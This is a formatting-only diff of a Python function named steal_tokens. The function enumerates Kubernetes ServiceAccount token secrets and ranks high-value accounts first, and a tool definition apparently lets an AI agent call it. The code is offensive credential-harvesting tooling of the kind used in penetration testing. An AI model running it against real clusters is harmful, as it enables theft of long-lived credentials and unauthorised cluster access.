@@ -57,23 +57,14 @@ def steal_tokens(k8s, namespace: str = "all") -> str:
         return f"Kubernetes API error: {e.status} {e.reason}"
 
     # filter to SA token type only
-    sa_tokens = [
-        s for s in secret_list.items if s.type == "kubernetes.io/service-account-token" and s.data and "token" in s.data
-    ]
+    sa_tokens = [s for s in secret_list.items if s.type == "kubernetes.io/service-account-token" and s.data and "token" in s.data]
 
     if not sa_tokens:
-        return (
-            "No static ServiceAccount tokens found. "
-            "Cluster may be using projected tokens (1.24+) which are not stored in secrets."
-        )
+        return "No static ServiceAccount tokens found. Cluster may be using projected tokens (1.24+) which are not stored in secrets."
 
     # sort high value first
     sa_tokens.sort(
-        key=lambda s: (
-            0
-            if _score((s.metadata.annotations or {}).get("kubernetes.io/service-account.name", "")) == "HIGH VALUE"
-            else 1
-        )
+        key=lambda s: 0 if _score((s.metadata.annotations or {}).get("kubernetes.io/service-account.name", "")) == "HIGH VALUE" else 1
     )
 
     lines = [f"⚠ Found {len(sa_tokens)} static SA token(s) — these do not expire and survive pod deletion:\n"]
@@ -157,9 +148,7 @@ definition = {
         ),
         "parameters": {
             "type": "object",
-            "properties": {
-                "namespace": {"type": "string", "description": "Namespace to search, or 'all' for cluster-wide."}
-            },
+            "properties": {"namespace": {"type": "string", "description": "Namespace to search, or 'all' for cluster-wide."}},
             "required": [],
         },
     },
